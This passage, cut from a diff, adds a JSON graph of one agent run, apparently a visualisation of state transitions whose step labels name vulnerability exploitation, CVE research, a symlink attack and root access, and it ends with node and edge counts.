+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s10_9.2",
+      "to": "agent:Outbound:r1_s10_9.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s10_9.2",
+      "to": "agent:Outbound:r1_s10_10",
+      "label": "\u2192 10",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s10_9.2",
+      "to": "search:Outbound:r1_s10_10",
+      "label": "10 Vulnerability explo\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s10_10",
+      "to": "track:Outbound:r1_s10_10",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s10_10",
+      "to": "agent:Outbound:r1_s10_10",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s10_10",
+      "to": "agent:Outbound:r1_s10_10.1",
+      "label": "\u2192 10.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s10_10",
+      "to": "search:Outbound:r1_s10_10.1",
+      "label": "10.1 CVE research",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s10_10.1",
+      "to": "track:Outbound:r1_s10_10.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s10_10.1",
+      "to": "agent:Outbound:r1_s10_10.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s10_10.1",
+      "to": "agent:Outbound:r1_s11_10.2",
+      "label": "\u2192 10.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s10_10.1",
+      "to": "search:Outbound:r1_s11_10.2",
+      "label": "10.2 Symlink attack",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s11_10.2",
+      "to": "track:Outbound:r1_s11_10.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s11_10.2",
+      "to": "agent:Outbound:r1_s11_10.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s11_10.2",
+      "to": "agent:Outbound:r1_s12_10.3",
+      "label": "\u2192 10.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s11_10.2",
+      "to": "search:Outbound:r1_s12_10.3",
+      "label": "10.3 Root access",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Outbound:r1_s12_10.3",
+      "to": "track:Outbound:r1_s12_10.3",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Outbound:r1_s12_10.3",
+      "to": "agent:Outbound:r1_s12_10.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Outbound:r1_s12_10.3",
+      "to": "agent:Outbound:r1_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 74,
+    "total_edges": 97,
+    "agent_nodes": 26,
+    "search_nodes": 24,
+    "track_nodes": 24,
+    "runs_detected": 1,
+    "rows_captured": 13
+  }
+}
